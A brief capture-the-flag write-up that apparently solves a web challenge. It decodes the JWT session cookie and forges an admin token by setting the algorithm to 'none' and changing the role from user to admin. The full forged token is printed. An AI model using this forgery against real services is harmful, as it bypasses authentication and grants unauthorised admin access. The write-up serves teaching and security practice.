# Writup

Log into the system. The username is *user* and the password *incorrect*.

A cookie will be added called *token*. This token is a JWT token.

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
.
eyJhdXRoIjo1MTQ2MiwidGV4dCI6IkkgZG8gbG92ZSBhIGdvb2QgcHV6emxlLiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjA1ODg1MDM1fQ
.
EN3v4Kr8_OHn-rhV0ME9QwsMvGv-47XQ7eeRMHqa0oQ
```

```
{"typ":"JWT","alg":"HS256"}
.
{"auth":51462,"text":"I do love a good puzzle.","role":"user","iat":1605885035}
.
EN3v4Kr8_OHn-rhV0ME9QwsMvGv-47XQ7eeRMHqa0oQ
```

```
{"typ":"JWT","alg":"none"}
.
{"auth":51462,"text":"I do love a good puzzle.","role":"admin","iat":1605885035}
.
```

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0
.
eyJhdXRoIjo1MTQ2MiwidGV4dCI6IkkgZG8gbG92ZSBhIGdvb2QgcHV6emxlLiIsInJvbGUiOiJh
ZG1pbiIsImlhdCI6MTYwNTg4NTAzNX0
.
```

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdXRoIjo1MTQ2MiwidGV4dCI6IkkgZG8gbG92ZSBhIGdvb2QgcHV6emxlLiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNTg4NTAzNX0.
```
